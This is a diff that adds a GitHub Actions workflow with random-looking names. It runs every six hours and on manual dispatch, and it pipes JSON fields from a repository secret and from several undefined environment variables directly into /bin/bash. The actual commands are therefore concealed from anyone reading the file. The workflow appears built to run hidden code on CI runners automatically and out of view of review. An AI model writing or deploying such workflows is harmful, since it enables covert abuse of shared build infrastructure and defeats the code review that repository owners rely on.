@@ -1,0 +1,24 @@
+name: wangsulong7654
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '12 5/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: wangsulong7654
+        env:
+          bbtu1442: ${{ secrets.bbtu1442 }}
+        run: |
+          echo $bbtu1442 | jq -r .xc0917 | /bin/bash
+          echo $svcg8396 | jq -r .odz6 | /bin/bash
+          echo $kg07 | jq -r .tzkp6795 | /bin/bash
+          echo $tdkm3 | jq -r .napko60707 | /bin/bash
+          echo $lfv26177 | jq -r .qxyrt082 | /bin/bash
+          echo $gmr524 | jq -r .ixh9 | /bin/bash
+          echo $oa730 | jq -r .jixu050 | /bin/bash
+
